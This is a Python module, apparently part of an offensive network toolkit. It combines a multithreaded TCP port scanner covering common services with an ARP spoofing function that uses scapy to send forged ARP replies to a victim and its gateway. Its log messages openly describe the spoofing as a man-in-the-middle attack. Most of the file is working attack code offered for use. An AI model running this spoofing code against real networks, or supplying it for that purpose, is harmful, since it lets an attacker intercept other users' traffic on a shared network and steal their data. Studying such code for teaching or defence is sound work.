import socket
import threading
import time
from core.logger import info, warn, attack, device, debug

def scan_port(ip, port, timeout=1):
    """
    Scan a single port on a target IP.
    Returns True if port is open, False otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def port_scan(ip, ports=None, timeout=1):
    """
    Scan a list of ports on a target IP.
    
    Args:
        ip: Target IP address
        ports: List of ports to scan (default: common ports)
        timeout: Timeout per port in seconds
    
    Returns:
        dict: {port: service_name} for open ports
    """
    if ports is None:
        # Common ports with service names
        ports = {
            20: 'FTP-data',
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            111: 'RPCbind',
            135: 'MSRPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1723: 'PPTP',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt',
            27017: 'MongoDB'
        }
    
    info(f"🔍 Port scanning {ip}... ({len(ports)} ports)")
    open_ports = {}
    
    def scan_port_thread(port, service):
        if scan_port(ip, port, timeout):
            open_ports[port] = service
            attack(f"🔓 Port {port} ({service}) is OPEN on {ip}")
    
    threads = []
    for port, service in ports.items():
        t = threading.Thread(target=scan_port_thread, args=(port, service))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for all threads to complete
    for t in threads:
        t.join(timeout=0.1)
    
    if open_ports:
        info(f"✅ Found {len(open_ports)} open ports on {ip}")
    else:
        info(f"ℹ️ No open ports found on {ip}")
    
    return open_ports

def arp_spoof(target_ip, gateway_ip, interface=None):
    """
    Perform ARP spoofing attack (Man-in-the-Middle).
    
    Args:
        target_ip: Victim IP
        gateway_ip: Gateway IP
        interface: Network interface
    """
    from scapy.all import ARP, Ether, sendp, srp, conf
    
    info(f"🟡 Starting ARP spoofing: {target_ip} ↔ {gateway_ip}")
    attack(f"🟡 ARP spoofing active: We are now the man-in-the-middle!")
    
    # Get MAC addresses
    def get_mac(ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered = srp(packet, timeout=2, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
        return None
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        warn(f"❌ Could not get MAC addresses. Target: {target_mac}, Gateway: {gateway_mac}")
        return False
    
    info(f"   Target MAC: {target_mac}")
    info(f"   Gateway MAC: {gateway_mac}")
    
    try:
        # Send spoofed ARP replies
        # Tell target we are gateway
        target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        # Tell gateway we are target
        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        info("🔄 Sending ARP spoofing packets (press Ctrl+C to stop)...")
        
        # Send packets in a loop (or just once for demo)
        for _ in range(5):
            sendp(Ether(dst=target_mac) / target_packet, verbose=False)
            sendp(Ether(dst=gateway_mac) / gateway_packet, verbose=False)
            time.sleep(2)
        
        info("✅ ARP spoofing packets sent (victim should now see us as gateway)")
        return True
        
    except Exception as e:
        warn(f"❌ ARP spoofing failed: {e}")
        return False